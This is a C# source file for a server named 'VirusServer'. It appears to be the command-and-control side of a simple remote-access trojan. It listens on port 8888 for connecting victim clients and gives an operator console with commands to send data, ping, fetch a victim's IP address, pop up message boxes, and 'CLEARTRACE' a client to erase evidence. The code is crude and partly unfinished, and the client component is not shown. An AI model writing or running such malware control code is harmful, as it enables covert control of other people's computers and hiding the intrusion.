using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Net;
using System.Net.Sockets;
namespace VirusServer
{
    static class Program
    {
        public static void GetConnection()
        {
            //Thread thread1 = new Thread(() => {
            TcpClient client = server.AcceptTcpClient();
            clients.Add(client);
            Console.WriteLine("CONNECTED");

            //});


        }
        public const int port = 8888;
        static IPAddress ipAd = IPAddress.Any;//IPAddress.Parse("127.0.0.1");
        public static TcpListener server = new TcpListener(ipAd, port);
        public static List<TcpClient> clients = new List<TcpClient>();
        static void Main(string[] args)
        {

            server.Start();

            Task.Run(() => { StartClientAsync(); });
            //Thread thread = new Thread(() =>
            //{

            // GetConnection();
            console();


            //while (true)
            //{
            //    for (int i = 0; i < clients.Count; i++)
            //    {
            //        NetworkStream stream = clients[i].GetStream();
            //        if (stream.DataAvailable)
            //        {
            //            byte[] data = new byte[100];
            //            stream.Read(data, 0, data.Length);
            //            string str = System.Text.Encoding.Default.GetString(data);
            //            RecievedConsole(str, clients[i]);
            //            stream.Flush();
            //        }
            //        //stream.Close();
            //    }
            //}
            // });
            //thread.Start();
            // });

        }
        public static async Task StartClientAsync()
        {
            while (true)
            {
                var clientAccept = await server.AcceptTcpClientAsync();
                clients.Add(clientAccept);
                Console.WriteLine("CONNECTED");
                Task.Run(() => { StartReadingTheConsoleAsync(clientAccept); });
            }
        }
        public static async Task StartReadingTheConsoleAsync(TcpClient client)
        {
            while (true)
            {

                NetworkStream stream = client.GetStream();
                byte[] data = new byte[100];
                await stream.ReadAsync(data, 0, data.Length);
                string str = System.Text.Encoding.Default.GetString(data);
                RecievedConsole(str, client);
                ByteConsole(data,client);
                stream.Flush();

                //stream.Close();
            }
        }
        public static void ByteConsole(byte[] data, TcpClient client)
        {
            switch(data[0]){
                case 0:
                    Console.WriteLine("PONG!");
                    break;
                case 255:
                    switch (data[1])
                    {
                        case 0:
                            List<byte> dat = data.ToList<byte>();
                            dat.RemoveAt(0);
                            byte[] dat1 = dat.ToArray();
                            string str = System.Text.Encoding.Default.GetString(dat1);
                            Console.WriteLine(str);
                            break;
                        
                    }
                    break;
                default:
                    break;
            }
        }

        public static void RecievedConsole(string str, TcpClient client)
        {
            string[] command = str.Split(" ".ToCharArray());
            switch(command[0]){
                default:
                   // Console.WriteLine(str);
                    break;
            }
        }
        public static void WriteData(byte[] data, TcpClient client)
        {
            NetworkStream stream = client.GetStream();
            stream.Write(data, 0, data.Length);
            // stream.Close();
        }

        public static void console()
        {
            string com = Console.ReadLine();
            string[] command = com.Split(" ".ToCharArray());
            try
            {
                switch (command[0])
                {
                    case "SENDDATA":

                        List<byte> data = new List<byte>();
                        for (int i = 1; i < command.Length - 1; i++)
                        {

                            List<byte> data1 = Encoding.ASCII.GetBytes(command[i]+" ").ToList<byte>();
                            data.AddRange(data1);
                        }
                        int index = Int32.Parse(command[command.Length - 1]);
                        byte[] ayylmao = new byte[] { 1 }.Concat(data.ToArray()).ToArray();
                        NetworkStream stream = clients[index].GetStream();
                        stream.Write(ayylmao, 0, ayylmao.Length);

                        //  stream.Close();
                        console();
                        break;
                    case "CLEARTRACE":

                        byte[] data2 = new byte[] { 255, 1 };


                        int index1 = Int32.Parse(command[command.Length - 1]);

                        NetworkStream stream1 = clients[index1].GetStream();
                        stream1.Write(data2, 0, data2.Length);
                        //stream1.Close();

                        clients.RemoveAt(index1);
                        console();
                        break;
                    case "PING":

                        data2 = new byte[] { 0 };


                        index1 = Int32.Parse(command[command.Length - 1]);
                        stream1 = clients[index1].GetStream();
                        stream1.Write(data2, 0, data2.Length);
                        //stream1.Close();


                        console();
                        break;
                    case "GETIP":

                        data2 = new byte[] { 255, 0 };


                        index1 = Int32.Parse(command[command.Length - 1]);
                        stream1 = clients[index1].GetStream();
                        stream1.Write(data2, 0, data2.Length);
                        //stream1.Close();


                        console();
                        break;
                    case "GETCONNECTIONS":
                        GetConnection();
                        console();
                        break;
                    case "SHOWMESSAGEBOX":

                        data = new List<byte>();
                        for (int i = 0; i < command.Length - 1; i++)
                        {

                            List<byte> data1 = Encoding.ASCII.GetBytes(command[i] + " ").ToList<byte>();
                            data.AddRange(data1);
                        }
                        index = Int32.Parse(command[command.Length - 1]);
                        NetworkStream stream2 = clients[index].GetStream();

                        stream2.Write(data.ToArray(), 0, data.Count);
                        //  stream.Close();

                        console();
                        break;
                    default:
                        console();
                        break;
                }
            }
            catch
            {
                Console.WriteLine("ERROR!");
                console();
            }
        }
    }
    }

